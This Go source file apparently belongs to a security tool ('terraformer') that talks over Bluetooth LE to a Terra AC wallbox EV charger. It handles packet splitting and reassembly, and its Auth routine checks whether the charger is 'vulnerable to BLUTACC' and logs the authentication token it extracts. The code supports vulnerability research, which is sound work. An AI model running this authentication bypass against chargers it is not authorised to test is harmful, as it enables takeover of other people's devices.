package terraformer

import (
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"sync"
	"time"
	"tinygo.org/x/bluetooth"
)

type TerraACWallbox struct {
	SerialNumber string

	btDevice       *bluetooth.Device
	btRx           *bluetooth.DeviceCharacteristic
	btRxRawChan    chan []byte
	btRxPacketChan chan *terraACBTPacket
	btMtx          sync.Mutex

	btTx *bluetooth.DeviceCharacteristic

	btAttChan chan error

	token []byte
}

func NewTerraACWallbox(device *bluetooth.Device, serialNumber string) (tacw *TerraACWallbox, err error) {
	// these discover steps ensure that we are indeed connecting to a TACW and not some random thing
	// we also get the necessary communication characteristics
	srvcs, err := device.DiscoverServices([]bluetooth.UUID{bluetooth.New16BitUUID(0xfff0)})
	if err != nil {
		return nil, err
	}

	if len(srvcs) == 0 {
		return nil, errors.New(fmt.Sprintf("Cannot find TACW configuration service, not actually a CP?"))
	}

	srvc := srvcs[0]

	chars, err := srvc.DiscoverCharacteristics([]bluetooth.UUID{bluetooth.New16BitUUID(0xfff4), bluetooth.New16BitUUID(0xfff3)})
	if err != nil || len(chars) == 0 {
		return nil, errors.New(fmt.Sprintf("cannot find TACW configuration characteristics in service: %s", err))
	}

	log.Print("✅ Found TACW configuration service, proceeding..")

	// need larger MTU?

	acwb := TerraACWallbox{
		btDevice:     device,
		btRx:         &chars[0],
		btTx:         &chars[1],
		SerialNumber: serialNumber,
	}

	// attach the packet reconstructor
	err = acwb.Attach()
	return &acwb, err
}

func (wb *TerraACWallbox) Attach() (err error) {
	if wb.btRx == nil {
		return errors.New("btRx not defined")
	}
	wb.btRxRawChan = make(chan []byte, 3)
	err = wb.btRx.EnableNotifications(func(value []byte) {
		wb.btRxRawChan <- value
	})

	if wb.btAttChan != nil {
		return errors.New("wallbox is already attached to bluetooth session")
	}

	// Channel that will be closed when the scan is stopped.
	// Detecting whether the scan is stopped can be done by doing a non-blocking
	// read from it. If it succeeds, the scan is stopped.
	wb.btAttChan = make(chan error)

	// attach the packet reconstructor
	// this gets killed by poking wb.btAttChan (call wb.Disconnect())
	go wb.packetReconstructor()

	// short pause to allow things to settle
	time.Sleep(500 * time.Millisecond)
	return
}

func (wb *TerraACWallbox) Disconnect() error {
	if wb.btAttChan == nil {
		return errors.New("wallbox is not attached to bluetooth session")
	}

	wb.btAttChan <- nil
	wb.btRxRawChan = nil

	return wb.btDevice.Disconnect()
}

func tacwPacketSplitter(data []byte) (packets [][]byte) {
	if len(data) <= 20 {
		// no splitting required
		return [][]byte{[]byte(data)}
	} else {
		// we need to batch our request into simple monthly affordable packets
		var chunk []byte
		packets = make([][]byte, 0, len(data)/21)
		for len(data) >= 20 {
			chunk, data = data[:20], data[20:]
			packets = append(packets, chunk)
		}
		if len(data) > 0 {
			packets = append(packets, data[:len(data)])
		}
		return packets
	}
}

func (wb *TerraACWallbox) packetReconstructor() {
	wb.btRxPacketChan = make(chan *terraACBTPacket)
	buf := make([]byte, 0)
	for {
		select {
		case data := <-wb.btRxRawChan:
			if len(buf) == 0 {
				// First packet, read the fourth byte to determine data
				// (safely though!)
				if len(data) >= 7 {
					length := data[4]
					// 16 bytes of prelude (basically if there's less than 4 bytes of data)
					if int(length) <= (len(data) - 16) {
						// This should be the only packet
						chnData, err := terraACBTPacketAssemble(data)
						if err != nil {
							log.Printf("Error assembling packet: %s", err)
						} else {
							wb.btRxPacketChan <- chnData
						}
					} else {
						// More packets are needed, sire
						buf = append(buf, data...)
					}
				}
			} else {
				// Continuation packet
				buf = append(buf, data...)
				length := buf[4]
				if int(length) == (len(buf) - 16) {
					// This is everything
					chnData, err := terraACBTPacketAssemble(buf)
					buf = nil
					if err != nil {
						log.Printf("Error assembling packet: %s", err)
					} else {
						wb.btRxPacketChan <- chnData
					}
				}
			}
		case <-wb.btAttChan:
			// kinda eww way of handling this, would be better in a for loop
			close(wb.btAttChan)
			wb.btAttChan = nil
			break
		}
	}
}

func (wb *TerraACWallbox) read(timeout time.Duration) (packet *terraACBTPacket, err error) {
	for {
		select {
		case data := <-wb.btRxPacketChan:
			// just pull the data out of the packet we don't need anything else
			return data, nil
		case <-time.After(timeout):
			return nil, errors.New("timed out awaiting response")
		}
	}
}

func (wb *TerraACWallbox) write(data []byte) (err error) {
	if wb.btTx == nil {
		return errors.New("transmit bluetooth characteristic unavailable")
	}
	packetsToSend := tacwPacketSplitter(data)
	for _, p := range packetsToSend {
		l, err := wb.btTx.WriteWithoutResponse(p)
		if err != nil {
			return err
		}
		if len(p) != l {
			return errors.New("did not send full bluetooth packet length - this should never happen")
		}
	}
	return nil
}

func (wb *TerraACWallbox) Auth() (err error) {
	log.Print("👏 Asking Wallbox very, very nicely to authenticate using BLUTACC...")

	wb.token, err = wb.cmdAuthenticate()
	if err != nil {
		log.Printf("🔒 Wallbox not vulnerable to BLUTACC! Error: %s", err)
		return err
	}

	log.Printf("🙌 Wallbox vulnerable to BLUTACC! It gave us a token: %s", hex.EncodeToString(wb.token))
	return nil
}
